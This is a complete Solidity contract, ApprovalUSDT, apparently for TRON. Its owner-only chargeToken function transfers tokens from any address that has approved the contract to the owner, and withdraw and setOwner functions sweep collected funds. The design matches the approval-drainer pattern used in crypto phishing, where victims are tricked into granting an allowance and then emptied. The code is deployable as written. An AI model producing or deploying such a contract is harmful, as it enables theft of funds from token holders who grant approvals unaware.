// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// ✅ STEP 1: Declare interface FIRST
interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

// ✅ STEP 2: Contract with clear name
contract ApprovalUSDT {
    address public owner;
    
    event Charged(address indexed token, address indexed from, address indexed to, uint256 amount);
    event TokenWithdrawn(address indexed token, uint256 amount);
    event TrxWithdrawn(uint256 amount);
    event OwnerChanged(address indexed newOwner);
    
    constructor() {
        owner = msg.sender;
        emit OwnerChanged(msg.sender);
    }
    
    function chargeToken(address token, address from, uint256 amount) external {
        require(msg.sender == owner, "Only owner can charge");
        IERC20(token).transferFrom(from, owner, amount);
        emit Charged(token, from, owner, amount);
    }
    
    function charge(address token, uint256 amount) external {
        require(msg.sender == owner, "Only owner can charge");
        IERC20(token).transferFrom(msg.sender, owner, amount);
        emit Charged(token, msg.sender, owner, amount);
    }
    
    function withdrawToken(address tokenAddress) external {
        require(msg.sender == owner, "Only owner");
        uint256 balance = IERC20(tokenAddress).balanceOf(address(this));
        IERC20(tokenAddress).transfer(owner, balance);
        emit TokenWithdrawn(tokenAddress, balance);
    }
    
    function withdrawTRX() external {
        require(msg.sender == owner, "Only owner");
        uint256 balance = address(this).balance;
        (bool sent, ) = owner.call{value: balance}("");
        require(sent, "Failed to send TRX");
        emit TrxWithdrawn(balance);
    }
    
    function setOwner(address newOwner) external {
        require(msg.sender == owner, "Only owner");
        owner = newOwner;
        emit OwnerChanged(newOwner);
    }
    
    receive() external payable {}
}